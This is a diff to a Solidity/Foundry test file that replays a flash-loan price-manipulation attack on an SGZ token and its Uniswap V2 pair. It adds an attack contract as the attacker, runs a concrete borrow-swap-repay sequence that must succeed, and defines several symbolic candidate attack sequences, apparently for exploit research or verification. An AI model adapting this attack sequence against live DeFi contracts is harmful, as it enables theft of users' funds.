@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+import "./AttackContract.sol";
 import "./SGZ.sol";
 import "@utils/QueryBlockchain.sol";
 import "forge-std/Test.sol";
@@ -14,13 +15,15 @@ contract SGZTest is Test, BlockLoader {
     UniswapV2Pair pair;
     UniswapV2Factory factory;
     UniswapV2Router router;
+    AttackContract attackContract;
+    address owner;
     address attacker;
-    address owner = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
     address usdtAddr;
     address sgzAddr;
     address pairAddr;
     address factoryAddr;
     address routerAddr;
+    address attackContractAddr;
     uint256 blockTimestamp = 1657743400;
     uint112 reserve0pair = 75972570174789479868300310831021;
     uint112 reserve1pair = 90560725378390149771577;
@@ -39,9 +42,7 @@ contract SGZTest is Test, BlockLoader {
     uint256 balanceOfusdtsgz = 30378842175602511050329;
 
     function setUp() public {
-        vm.warp(blockTimestamp);
-        attacker = address(this);
-        vm.startPrank(owner);
+        owner = address(this);
         usdt = new USDT();
         usdtAddr = address(usdt);
         sgz = new SGZ(address(usdt));
@@ -66,6 +67,9 @@ contract SGZTest is Test, BlockLoader {
         factoryAddr = address(factory);
         router = new UniswapV2Router(address(factory), address(0xdead));
         routerAddr = address(router);
+        attackContract = new AttackContract();
+        attackContractAddr = address(attackContract);
+        attacker = address(attackContract);
         sgz.afterDeploy(address(router), address(pair));
         // Initialize balances and mock flashloan.
         usdt.transfer(address(sgz), balanceOfusdtsgz);
@@ -74,7 +78,6 @@ contract SGZTest is Test, BlockLoader {
         sgz.transfer(address(pair), balanceOfsgzpair);
         usdt.approve(attacker, UINT256_MAX);
         sgz.approve(attacker, UINT256_MAX);
-        vm.stopPrank();
     }
 
     function printBalance(string memory tips) public {
@@ -99,9 +102,17 @@ contract SGZTest is Test, BlockLoader {
         );
         queryERC20BalanceDecimals(address(sgz), address(pair), sgz.decimals());
         emit log_string("");
-        emit log_string("Attacker Balances: ");
-        queryERC20BalanceDecimals(address(usdt), attacker, usdt.decimals());
-        queryERC20BalanceDecimals(address(sgz), attacker, sgz.decimals());
+        emit log_string("Attackcontract Balances: ");
+        queryERC20BalanceDecimals(
+            address(usdt),
+            address(attackContract),
+            usdt.decimals()
+        );
+        queryERC20BalanceDecimals(
+            address(sgz),
+            address(attackContract),
+            sgz.decimals()
+        );
         emit log_string("");
         emit log_string("");
         emit log_string("");
@@ -168,6 +179,7 @@ contract SGZTest is Test, BlockLoader {
     }
 
     function test_gt() public {
+        vm.startPrank(attacker);
         borrow_usdt(100e18);
         printBalance("After step0 ");
         swap_pair_usdt_sgz(usdt.balanceOf(attacker));
@@ -179,6 +191,7 @@ contract SGZTest is Test, BlockLoader {
         payback_usdt((100e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
+        vm.stopPrank();
     }
 
     function check_gt(
@@ -187,6 +200,7 @@ contract SGZTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_sgz(amt1);
@@ -194,6 +208,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_sgz_usdt(amt2);
         payback_usdt(amt3);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand000(
@@ -202,6 +217,7 @@ contract SGZTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_sgz(amt1);
@@ -209,6 +225,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_sgz_usdt(amt2);
         payback_usdt(amt3);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand001(
@@ -217,6 +234,7 @@ contract SGZTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_sgz(amt0);
         swap_pair_sgz_usdt(amt1);
@@ -224,6 +242,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_usdt_sgz(amt2);
         payback_sgz(amt3);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand002(
@@ -233,6 +252,7 @@ contract SGZTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_sgz(amt1);
@@ -241,6 +261,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_sgz_usdt(amt3);
         payback_usdt(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand003(
@@ -249,6 +270,7 @@ contract SGZTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_sgz(amt1);
@@ -257,6 +279,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_sgz_usdt(amt2);
         payback_usdt(amt3);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand004(
@@ -266,6 +289,7 @@ contract SGZTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_sgz(amt0);
         swap_pair_sgz_usdt(amt1);
@@ -274,6 +298,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_sgz_usdt(amt3);
         payback_sgz(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand005(
@@ -282,6 +307,7 @@ contract SGZTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_sgz(amt0);
         swap_pair_sgz_usdt(amt1);
@@ -290,6 +316,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_usdt_sgz(amt2);
         payback_sgz(amt3);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand006(
@@ -299,6 +326,7 @@ contract SGZTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_sgz(amt1);
@@ -308,6 +336,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_sgz_usdt(amt3);
         payback_usdt(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand007(
@@ -317,6 +346,7 @@ contract SGZTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_sgz(amt0);
         swap_pair_sgz_usdt(amt1);
@@ -326,5 +356,6 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_sgz_usdt(amt3);
         payback_sgz(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 }
